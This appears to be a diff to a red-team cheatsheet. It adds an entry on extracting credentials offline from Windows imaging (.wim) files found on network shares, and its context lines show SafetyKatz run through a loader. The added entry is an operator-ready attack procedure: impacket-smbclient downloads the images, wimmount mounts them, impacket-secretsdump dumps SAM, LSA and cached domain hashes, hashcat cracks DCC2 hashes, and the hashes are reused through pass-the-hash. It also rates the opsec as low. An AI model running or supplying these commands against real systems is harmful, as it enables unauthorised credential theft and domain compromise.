@@ -162,3 +162,27 @@
   # Step 2: Pass encoded arg to SafetyKatz via Loader
   Loader.exe -path SafetyKatz.exe -args "%Pwn%" "exit"
   ```
+
+### WIM File Offline Secrets Extraction [added: 2026-04]
+- **Tags:** #CredentialDumping #WIM #WindowsImaging #secretsdump #OfflineDump #SAM #LSA #CachedCreds
+- **Trigger:** SMB share contains `.wim` files; disk images accessible on a network share (imaging/deployment infrastructure)
+- **Prereq:** Read access to a share containing `.wim` files; `wimtools` installed on attacker Linux box
+- **Yields:** Local SAM hashes, LSA secrets, cached domain logon hashes (DCC2) for users who previously logged on to imaged workstation
+- **Opsec:** Low (fully offline, no network auth to target)
+- **Context:** Deployment/imaging shares often contain WIM snapshots of workstations. Workstations may have cached domain creds from prior logins that reuse domain passwords.
+- **Payload/Method:**
+  ```bash
+  # Download WIM files from SMB share
+  impacket-smbclient -k domain/user:pass@DC.domain.local
+  # use images$; mget *
+
+  # Mount the WIM (try each split part; -02 usually has the OS)
+  sudo wimmount MACHINE-02.wim /mnt
+
+  # Dump all secrets offline
+  impacket-secretsdump -system /mnt/SYSTEM -sam /mnt/SAM -security /mnt/SECURITY local
+
+  # DCC2 cached hash → crack with hashcat mode 2100
+  hashcat -m 2100 '$DCC2$10240#user#hash' /usr/share/wordlists/rockyou.txt
+  # Or reuse operator/local hash directly against domain user via Pass-the-Hash
+  ```
